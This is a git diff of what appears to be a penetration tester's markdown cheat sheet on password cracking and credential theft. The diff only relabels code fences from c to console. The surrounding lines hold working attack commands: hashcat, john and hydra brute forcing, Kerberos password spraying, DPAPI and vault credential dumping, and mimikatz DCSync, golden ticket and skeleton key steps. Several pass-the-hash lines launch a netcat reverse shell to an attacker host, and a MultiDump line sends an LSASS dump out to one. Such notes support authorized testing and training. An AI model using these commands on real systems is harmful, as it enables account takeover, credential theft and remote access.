@@ -70,7 +70,7 @@
 
 #### Create AES File
 
-```c
+```console
 aes-256-ctr
 aes-128-ofb
 aes-192-ofb
@@ -82,13 +82,13 @@ aes-256-ecb
 
 #### Create String File
 
-```c
+```console
 Tq+CWzQS0wYzs2rJ+GNrPLP6qekDbwze6fIeRRwBK2WXHOhba7WR2OGNUFKoAvyW7njTCMlQzlwIRdJvaP2iYQ==
 ```
 
 #### For Loop
 
-```c
+```console
 $ for i in `cat aes`; do cat string | openssl enc -d -$i -K 214125442A472D4B6150645367566B59 -iv 0 -nopad -nosalt -base64; done
 ```
 
@@ -96,16 +96,16 @@ $ for i in `cat aes`; do cat string | openssl enc -d -$i -K 214125442A472D4B6150
 
 ### Cracking .zip File
 
-```c
+```console
 $ ./bkcrack -L <FILE>.zip
 ```
 
-```c
+```console
 $ cat plaintext.txt
 Secret:HTB{
 ```
 
-```c
+```console
 $ ./bkcrack -c tmp/fd734d942c6f729a36606b16a3ef17f8/<FILE>.txt -C <FILE>.zip -p plaintext.txt
 ```
 
@@ -117,24 +117,24 @@ $ ./bkcrack -c tmp/fd734d942c6f729a36606b16a3ef17f8/<FILE>.txt -C <FILE>.zip -p 
 
 ### List Vault
 
-```c
+```console
 C:\> vaultcmd /listcreds:"Windows Credentials" /all
 ```
 
-```c
+```console
 mimikatz vault::list
 ```
 
 ### Credential Files
 
-```c
+```console
 C:\> dir /a:h C:\Users\<USERNAME>\AppData\Local\Microsoft\Credentials\
 C:\> dir /a:h C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Credentials\
 PS C:\> Get-ChildItem -Hidden C:\Users\<USERNAME>\AppData\Local\Microsoft\Credentials\
 PS C:\> Get-ChildItem -Hidden C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Credentials\
 ```
 
-```c
+```console
 PS C:\> Get-ChildItem C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Protect\
 PS C:\> Get-ChildItem C:\Users\<USERNAME>\AppData\Local\Microsoft\Protect
 PS C:\> Get-ChildItem -Hidden C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Protect\
@@ -145,13 +145,13 @@ PS C:\> Get-ChildItem -Hidden C:\Users\<USERNAME>\AppData\Local\Microsoft\Protec
 
 ### Get Masterkey
 
-```c
+```console
 $ impacket-dpapi masterkey -file 99cf31a4-a552-4cf7-a8d7-aca2d6f7339b -password <PASSWORD> -sid S-1-5-21-4024337825-2033395866-2055507597-1115
 ```
 
 ### Decrypt Data
 
-```c
+```console
 $ impacket-dpapi credential -file C4BB96844A5C9DD43D5B6A9759252BA6 -key 0xf8901b3125dd10208da9f66562df2e68e89a48cd0278b48a47f510df01418e68b253c61707f3935662243d81c0d352f1bc8055523bf65b2d763191ecd44e525a
 ```
 
@@ -159,7 +159,7 @@ $ impacket-dpapi credential -file C4BB96844A5C9DD43D5B6A9759252BA6 -key 0xf8901b
 
 > https://github.com/login-securite/DonPAPI
 
-```c
+```console
 $ DonPAPI <DOMAIN>/<USERNAME>:<PASSWORD>@<RHOST>
 $ DonPAPI -local_auth <USERNAME>@<RHOST>
 $ DonPAPI --hashes <LM>:<NT> <DOMAIN>/<USERNAME>@<RHOST>
@@ -168,7 +168,7 @@ $ DonPAPI -laps <DOMAIN>/<USERNAME>:<PASSWORD>@<RHOST>
 
 ## fcrack
 
-```c
+```console
 $ fcrackzip -u -D -p /PATH/TO/WORDLIST/<WORDLIST> <FILE>.zip
 ```
 
@@ -178,7 +178,7 @@ $ fcrackzip -u -D -p /PATH/TO/WORDLIST/<WORDLIST> <FILE>.zip
 
 > https://github.com/t0thkr1s/gpp-decrypt
 
-```c
+```console
 $ python3 gpp-decrypt.py -f Groups.xml
 $ python3 gpp-decrypt.py -c edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
 ```
@@ -187,7 +187,7 @@ $ python3 gpp-decrypt.py -c edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOs
 
 > https://github.com/s0md3v/Hash-Buster
 
-```c
+```console
 $ buster -s 2b6d315337f18617ba18922c0b9597ff
 ```
 
@@ -203,7 +203,7 @@ $ buster -s 2b6d315337f18617ba18922c0b9597ff
 
 ### Common Commands
 
-```c
+```console
 $ hashcat -m 0 md5 /PATH/TO/WORDLIST/<WORDLIST>
 $ hashcat -m 100 sha-1 /PATH/TO/WORDLIST/<WORDLIST>
 $ hashcat -m 1400 sha256 /PATH/TO/WORDLIST/<WORDLIST>
@@ -218,20 +218,20 @@ $ hashcat -O -m 500 -a 3 -1 ?l -2 ?d -3 ?u  --force hash.txt ?3?3?1?1?1?1?2?3
 
 ### Hash Example Search
 
-```c
+```console
 $ hashcat --example-hashes
 $ hashcat --help | grep -i "ntlm"
 ```
 
 ### Identify Hashes
 
-```c
+```console
 $ hashcat --identify --user <FILE>
 ```
 
 ### Hash Rules
 
-```c
+```console
 /usr/share/wordlists/fasttrack.txt
 /usr/share/hashcat/rules/best64.rule
 ```
@@ -242,20 +242,20 @@ $ hashcat --identify --user <FILE>
 
 #### Add a 1 to each Password
 
-```c
+```console
 $ echo \$1 > <FILE>.rule
 ```
 
 #### Capitalize first character
 
-```c
+```console
 $1
 c
 ```
 
 #### Add nothing, a 1 or a ! to an existing Wordlist
 
-```c
+```console
 :
 $1
 $!
@@ -268,7 +268,7 @@ $!
 - $3 > appends a "3"
 - c > Capitalize the first character and lower case the rest
 
-```c
+```console
 $1 c $!
 $2 c $!
 $1 $2 $3 c $!
@@ -276,7 +276,7 @@ $1 $2 $3 c $!
 
 #### Rule Preview
 
-```c
+```console
 $ hashcat -r <FILE>.rule --stdout <FILE>.txt
 ```
 
@@ -296,13 +296,13 @@ FOOBAR?u?u?u?u
 
 ### Cracking ASPREPRoast Password File
 
-```c
+```console
 $ hashcat -m 18200 -a 0 <FILE> <FILE>
 ```
 
 ### Cracking Kerberoasting Password File
 
-```c
+```console
 $ hashcat -m 13100 --force <FILE> <FILE>
 ```
 
@@ -310,41 +310,41 @@ $ hashcat -m 13100 --force <FILE> <FILE>
 
 > https://0xdf.gitlab.io/2024/12/14/htb-compiled.html#crack-gitea-hash
 
-```c
+```console
 $ sqlite3 gitea.db "select passwd,salt,name from user" | while read data; do digest=$(echo "$data" | cut -d'|' -f1 | xxd -r -p | base64); salt=$(echo "$data" | cut -d'|' -f2 | xxd -r -p | base64); name=$(echo $data | cut -d'|' -f 3); echo "${name}:sha256:50000:${salt}:${digest}"; done | tee gitea.hashes
 ```
 
-```c
+```console
 $ hashcat gitea.hashes /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt --user
 ```
 
 ### Bruteforce based on the Pattern
 
-```c
+```console
 $ hashcat -a3 -m0 mantas?d?d?d?u?u?u --force --potfile-disable --stdout
 ```
 
 ### Generate Password Candidates: Wordlist + Pattern
 
-```c
+```console
 $ hashcat -a6 -m0 "e99a18c428cb38d5f260853678922e03" yourPassword|/PATH/TO/WORDLIST/<WORDLIST> ?d?d?d?u?u?u --force --potfile-disable --stdout
 ```
 
 ### Generate NetNLTMv2 with internalMonologue and crack with hashcat
 
-```c
+```console
 $ InternalMonologue.exe -Downgrade False -Restore False -Impersonate True -Verbose False -challange 002233445566778888800
 ```
 
 ### Result
 
-```c
+```console
 spotless::WS01:1122334455667788:26872b3197acf1da493228ac1a54c67c:010100000000000078b063fbcce8d4012c90747792a3cbca0000000008003000300000000000000001000000002000006402330e5e71fb781eef13937448bf8b0d8bc9e2e6a1e1122fd9d690fa9178c50a0010000000000000000000000000000000000009001a0057005300300031005c00730070006f0074006c006500730073000000000000000000
 ```
 
 ### Crack with hashcat
 
-```c
+```console
 $ hashcat -m5600 'spotless::WS01:1122334455667788:26872b3197acf1da493228ac1a54c67c:010100000000000078b063fbcce8d4012c90747792a3cbca0000000008003000300000000000000001000000002000006402330e5e71fb781eef13937448bf8b0d8bc9e2e6a1e1122fd9d690fa9178c50a0010000000000000000000000000000000000009001a0057005300300031005c00730070006f0074006c006500730073000000000000000000' -a 3 /PATH/TO/WORDLIST/<WORDLIST> --force --potfile-disable
 ```
 
@@ -354,7 +354,7 @@ $ hashcat -m5600 'spotless::WS01:1122334455667788:26872b3197acf1da493228ac1a54c6
 
 #### Cracking with OneRuleToRuleThemAll.rule
 
-```c
+```console
 $ hashcat -m 3200 hash.txt -r /PATH/TO/FILE/<FILE>.rule
 ```
 
@@ -364,7 +364,7 @@ $ hashcat -m 3200 hash.txt -r /PATH/TO/FILE/<FILE>.rule
 
 ### Common Commands
 
-```c
+```console
 $ hydra <RHOST> -l <USERNAME> -p <PASSWORD> <PROTOCOL>
 $ hydra <RHOST> -L /PATH/TO/WORDLIST/<FILE> -P /PATH/TO/WORDLIST/<FILE> <PROTOCOL>
 $ hydra <RHOST> -C /PATH/TO/WORDLIST/<FILE> ftp
@@ -372,63 +372,63 @@ $ hydra <RHOST> -C /PATH/TO/WORDLIST/<FILE> ftp
 
 ### Proxy
 
-```c
+```console
 $ export HYDRA_PROXY=connect://127.0.0.1:8080
 $ unset HYDRA_PROXY
 ```
 
 ### SSH
 
-```c
+```console
 $ hydra <RHOST> -L usernames.txt -P passwords.txt ssh -V
 $ hydra <RHOST> -l <USERNAME> -P /PATH/TO/WORDLIST/<FILE> ssh -t 4
 ```
 
 ### FTP
 
-```c
+```console
 $ hydra <RHOST> -L usernames.txt -P passwords.txt ftp -V -f
 ```
 
 ### SMB
 
-```c
+```console
 $ hydra <RHOST> -L usernames.txt -P passwords.txt smb -V -f
 ```
 
 ### MySQL
 
-```c
+```console
 $ hydra <RHOST> -L usernames.txt -P passwords.txt mysql -V -f
 ```
 
 ### Postgres
 
-```c
+```console
 $ hydra <RHOST> -L usernames.txt -P passwords.txt postgres -V
 ```
 
 ### Telnet
 
-```c
+```console
 $ hydra <RHOST> -L usernames.txt -P passwords.txt telnet -V
 ```
 
 ### VNC
 
-```c
+```console
 $ hydra <RHOST> -P passwords.txt vnc -V
 ```
 
 ### Docker Registry
 
-```c
+```console
 $ hydra <RHOST> -L usernames.txt  -P passwords.txt -s 5000 https-get /v2/
 ```
 
 ### Webform
 
-```c
+```console
 $ hydra <RHOST> -l <USERNAME> -P /PATH/TO/WORDLIST/<FILE> http-post-form "/admin.php:username=^USER^&password=^PASS^:login_error"
 $ hydra <RHOST> -l <USERNAME> -P /PATH/TO/WORDLIST/<FILE> http-post-form "/index.php:username=user&password=^PASS^:Login failed. Invalid"
 $ hydra <RHOST> -L /PATH/TO/WORDLIST/<FILE> -P /PATH/TO/WORDLIST/<FILE> http-post-form "/login:usernameField=^USER^&passwordField=^PASS^:unsuccessfulMessage" -s <RPORT>
@@ -440,7 +440,7 @@ $ hydra <RHOST> -l admin -P /PATH/TO/WORDLIST/<FILE> http-post-form "/Account/lo
 
 > https://github.com/openwall/john
 
-```c
+```console
 $ john md5 --wordlist=/PATH/TO/WORDLIST/<WORDLIST> --format=raw-md5
 $ john sha-1 --wordlist=/PATH/TO/WORDLIST/<WORDLIST> --format=raw-sha1
 $ john sha256 --wordlist=/PATH/TO/WORDLIST/<WORDLIST> --format=raw-sha256
@@ -452,51 +452,51 @@ $ john sha512 --wordlist=/PATH/TO/WORDLIST/<WORDLIST>
 
 ### Show cracked Password
 
-```c
+```console
 $ john --show <FILE>
 ```
 
 ### Using Salt
 
-```c
+```console
 $ john <FILE> --wordlist=/PATH/TO/WORDLIST/<WORDLIST> --format=raw-md5 --mask='<SALT>?w'
 ```
 
 ### Cracking .zip-Files
 
-```c
+```console
 $ zip2john <FILE> > <FILE>
 ```
 
 ### Cracking EncFS/6
 
-```c
+```console
 $ encfs2john <DIRECTORY>/ > encfs6.xml.john
 $ john encfs6.xml.john --wordlist=/PATH/TO/WORDLIST/<WORDLIST>
 ```
 
 ### Cracking Kerberoasting Password File
 
-```c
+```console
 $ john --format=krb5tgs --wordlist=<FILE> <FILE>
 ```
 
 ### Cracking RSA
 
-```c
+```console
 $ ssh2john id_rsa > <FILE>
 $ john <FILE> --wordlist=/PATH/TO/WORDLIST/<WORDLIST> --format=ssh
 ```
 
 ### Cracking yescrypt
 
-```c
+```console
 $ john <FILE> --wordlist=/PATH/TO/WORDLIST/<WORDLIST> --format=crypt
 ```
 
 ### Extracting Hash from .kdbx File
 
-```c
+```console
 $ keepass2john <FILE>
 ```
 
@@ -506,13 +506,13 @@ $ keepass2john <FILE>
 
 ### User Enumeration
 
-```c
+```console
 $ ./kerbrute userenum -d <DOMAIN> --dc <DOMAIN> /PATH/TO/FILE/<USERNAMES>
 ```
 
 ### Password Spray
 
-```c
+```console
 $ ./kerbrute passwordspray -d <DOMAIN> --dc <DOMAIN> /PATH/TO/FILE/<USERNAMES> <PASSWORD>
 ```
 
@@ -520,7 +520,7 @@ $ ./kerbrute passwordspray -d <DOMAIN> --dc <DOMAIN> /PATH/TO/FILE/<USERNAMES> <
 
 > https://github.com/AlessandroZ/LaZagne
 
-```c
+```console
 C:\> laZagne.exe all
 ```
 
@@ -528,13 +528,13 @@ C:\> laZagne.exe all
 
 ### Extracting LUKS Header
 
-```c
+```console
 $ dd if=backup.img of=header.luks bs=512 count=4097
 ```
 
 ## Medusa
 
-```c
+```console
 $ medusa -h <RHOST> -U usernames.txt -P wordlist.txt -M smbnt
 ```
 
@@ -544,7 +544,7 @@ $ medusa -h <RHOST> -U usernames.txt -P wordlist.txt -M smbnt
 
 ### Common Commands
 
-```c
+```console
 mimikatz # token::elevate
 mimikatz # token::revert
 mimikatz # vault::cred
@@ -559,13 +559,13 @@ mimikatz # lsadump::dcsync /<USERNAME>:<DOMAIN>\krbtgt /domain:<DOMAIN>
 
 This is helpful when executing within a `Evil-WinRM` session.
 
-```c
+```console
 C:\> mimikatz.exe "sekurlsa::logonpasswords" "exit"
 ```
 
 ### Dump Hashes
 
-```c
+```console
 C:\> .\mimikatz.exe
 mimikatz # sekurlsa::minidump /users/admin/Desktop/lsass.DMP
 mimikatz # sekurlsa::LogonPasswords
@@ -576,32 +576,32 @@ meterpreter > golden_ticket_create
 
 ### Overpass-the-hash / Pass-the-Key
 
-```c
+```console
 mimikatz # privilege::debug
 mimikatz # sekurlsa::ekeys
 ```
 
 #### RC4
 
-```c
+```console
 mimikatz # sekurlsa::pth /user:Administrator /domain:<DOMAIN> /rc4:96ea24eff4dff1fbe13818fbf12ea7d8 /run:"C:\nc64.exe -e cmd.exe <LHOST> <LPORT>"
 ```
 
 #### AES128
 
-```c
+```console
 mimikatz # sekurlsa::pth /user:Administrator /domain:<DOMAIN> /aes128:b65ea8151f13a31d01377f5934bf3883 /run:"C:\nc64.exe -e cmd.exe <LHOST> <LPORT>"
 ```
 
 #### AES256
 
-```c
+```console
 mimikatz # sekurlsa::pth /user:Administrator /domain:<DOMAIN> /aes256:b54259bbff03af8d37a138c375e29254a2ca0649337cc4c73addcd696b4cdb65 /run:"C:\nc64.exe -e cmd.exe <LHOST> <LPORT>"
 ```
 
 ### Pass the Ticket
 
-```c
+```console
 C:\> .\mimikatz.exe
 mimikatz # sekurlsa::tickets /export
 mimikatz # kerberos::ptt [0;76126]-2-0-40e10000-Administrator@krbtgt-<RHOST>.LOCAL.kirbi
@@ -611,7 +611,7 @@ C:\> dir \\<RHOST>\admin$
 
 ### Forging Golden Ticket
 
-```c
+```console
 C:\> .\mimikatz.exe
 mimikatz # privilege::debug
 mimikatz # lsadump::lsa /inject /name:krbtgt
@@ -623,7 +623,7 @@ C:\> dir \\<RHOST>\admin$
 
 ### Skeleton Key
 
-```c
+```console
 C:\> .\mimikatz.exe
 mimikatz # privilege::debug
 mimikatz # misc::skeleton
@@ -637,15 +637,15 @@ C:\> dir \\<RHOST>\c$ /user:<USERNAME> mimikatz
 
 #### rpc
 
-```c
+```console
 mimikatz # dpapi::masterkey /in:"%appdata%\Microsoft\Protect\S-1-5-21-1199398058-4196589450-691661856-1107\191d3f9d-7959-4b4d-a520-a444853c47eb" /rpc
 ```
 
-```c
+```console
 mimikatz # dpapi::cache
 ```
 
-```c
+```console
 mimikatz # dpapi::cred /in:"C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Credentials\84F1CAEEBF466550F4967858F9353FB4"
 ```
 
@@ -653,11 +653,11 @@ mimikatz # dpapi::cred /in:"C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Creden
 
 > https://github.com/Xre0uS/MultiDump
 
-```c
+```console
 $ python3 MultiDumpHandler.py -r <LPORT>
 ```
 
-```c
+```console
 PS C:\> .\MultiDump.exe --procdump -r <LHOST>:<LPORT>
 ```
 
@@ -665,7 +665,7 @@ PS C:\> .\MultiDump.exe --procdump -r <LHOST>:<LPORT>
 
 > https://github.com/Pennyw0rth/NetExec
 
-```c
+```console
 $ sudo apt-get install pipx git
 $ pipx ensurepath
 $ pipx install git+https://github.com/Pennyw0rth/NetExec
@@ -673,7 +673,7 @@ $ pipx install git+https://github.com/Pennyw0rth/NetExec
 
 ### Installation via Poetry
 
-```c
+```console
 $ sudo apt-get install -y libssl-dev libffi-dev python-dev-is-python3 build-essential
 $ git clone https://github.com/Pennyw0rth/NetExec
 $ cd NetExec
@@ -683,7 +683,7 @@ $ poetry run NetExec
 
 ### Modules
 
-```c
+```console
 $ netexec ldap -L
 $ netexec mysql -L
 $ netexec smb -L
@@ -693,7 +693,7 @@ $ netexec winrm -L
 
 ### Common Commands
 
-```c
+```console
 $ netexec smb <RHOST> -u '' -p '' --shares
 $ netexec smb <RHOST> -u '' -p '' --shares -M spider_plus
 $ netexec smb <RHOST> -u '' -p '' --shares -M spider_plus -o READ_ONLY=false
@@ -770,7 +770,7 @@ $ netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<
 
 > https://github.com/lanjelot/patator
 
-```c
+```console
 $ patator ssh_login host=<RHOST> port=<RPORT> user=<USERNAME> password=FILE0 0=/PATH/TO/WORDLIST/<WORDLIST> persistent=0 -x ignore:mesg='Authentication failed.'
 $ patator ssh_login host=<RHOST> port=<RPORT> user=<USERNAME> password=FILE0 0=/PATH/TO/WORDLIST/<WORDLIST> persistent=0 -x ignore:fgrep='failed'
 $ patator ssh_login host=<RHOST> port=<RPORT> user=<USERNAME> password=FILE0 0=/PATH/TO/WORDLIST/<WORDLIST> persistent=0 -x ignore:egrep='failed'
@@ -778,7 +778,7 @@ $ patator ssh_login host=<RHOST> port=<RPORT> user=<USERNAME> password=FILE0 0=/
 
 ## PDFCrack
 
-```c
+```console
 $ pdfcrack -f file.pdf -w /PATH/TO/WORDLIST/<WORDLIST>
 ```
 
@@ -786,7 +786,7 @@ $ pdfcrack -f file.pdf -w /PATH/TO/WORDLIST/<WORDLIST>
 
 > https://github.com/skelsec/pypykatz
 
-```c
+```console
 $ pypykatz lsa minidump lsass.dmp
 $ pypykatz registry --sam sam system
 ```
@@ -795,7 +795,7 @@ $ pypykatz registry --sam sam system
 
 > https://github.com/Ganapati/RsaCtfTool
 
-```c
+```console
 $ python3 RsaCtfTool.py --publickey /PATH/TO/<KEY>.pub --uncipherfile /PATH/TO/FILE/<FILE>.enc
 ```
 
@@ -1222,7 +1222,7 @@ BruteForce $duration $threshold $passwords
 
 ### Usage
 
-```c
+```console
 PS C:\> .\Spray-Passwords.ps1 -Pass <PASSWORD> -Admin
 ```
 
@@ -1232,13 +1232,13 @@ PS C:\> .\Spray-Passwords.ps1 -Pass <PASSWORD> -Admin
 
 ### OWA
 
-```c
+```console
 $ python3 atomizer.py owa <RHOST> <PASSWORDS> <USERNAMES> -i 0:0:01
 ```
 
 ## VNC Password Recovery
 
-```c
+```console
 msf6 > irb
 [*] Starting IRB shell...
 [*] You are in the "framework" object
